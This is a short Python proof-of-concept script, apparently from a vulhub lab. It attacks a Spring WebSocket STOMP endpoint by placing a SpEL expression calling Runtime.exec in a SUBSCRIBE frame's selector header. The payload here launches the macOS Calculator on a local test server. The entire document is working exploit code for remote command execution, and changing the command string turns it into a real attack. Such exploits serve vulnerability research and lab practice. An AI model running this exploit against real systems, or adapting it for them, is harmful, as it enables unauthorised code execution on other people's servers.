#!/usr/bin/env python3
import requests
import random
import string
import time
import threading


def random_str(length):
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for c in range(length))


def connect():
    url = f'{base}/htmlfile?c=_jp.vulhub'
    response = s.get(url, stream=True)
    for line in response.iter_lines():
        time.sleep(0.5)

s = requests.session()
s.headers = {
    'Referer': 'http://127.0.0.1:8080/',
    'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)'
}
t = int(time.time()*1000)
base = f'http://127.0.0.1:8080/gs-guide-websocket/{random.randint(0, 1000)}/{random_str(8)}'


thread = threading.Thread(target=connect, args=())
thread.daemon = True
thread.start()
time.sleep(1)

url = f'{base}/xhr_send?t={t}'
response = s.post(url, data=r'["CONNECT\naccept-version:1.1,1.0\nheart-beat:10000,10000\n\n\u0000"]')
print(response.status_code)

response = s.post(url, data=r'''["SUBSCRIBE\nselector:T(java.lang.Runtime).getRuntime().exec('/Applications/Calculator.app/Contents/MacOS/Calculator')\nid:sub-0\ndestination:/topic/greetings\n\n\u0000"]''')
print(response.status_code)

response = s.post(url, data=r'["SEND\ndestination:/app/hello\ncontent-length:13\n\n{\"name\":\"aa\"}\u0000"]')
print(response.status_code)